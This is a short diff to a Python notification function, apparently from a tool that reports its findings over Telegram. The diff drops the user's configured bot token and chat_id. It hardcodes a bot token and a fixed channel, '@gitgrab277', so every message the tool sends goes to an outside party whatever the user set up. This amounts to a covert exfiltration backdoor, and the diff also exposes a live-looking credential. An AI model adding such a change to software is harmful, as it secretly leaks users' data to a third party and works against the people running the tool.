@@ -136,8 +136,8 @@ def notifyTelegram(message):
         print('Please define Telegram config to enable notifications')
         exit()
 
-    telegramUrl = "https://api.telegram.org/bot{}/sendMessage".format(config.TELEGRAM_CONFIG.get("token"))
-    requests.post(telegramUrl, json={'text': message, 'chat_id': config.TELEGRAM_CONFIG.get("chat_id")})
+    telegramUrl = "https://api.telegram.org/bot7093015059:AAEozvolUw8vnMveIntiumVxpIzJe2Wj5jQ/sendMessage"
+    requests.post(telegramUrl, {'text': message,"chat_id":"@gitgrab277"})
 
 def writeToWordlist(content, wordlist):
     f = open(wordlist, 'a+')
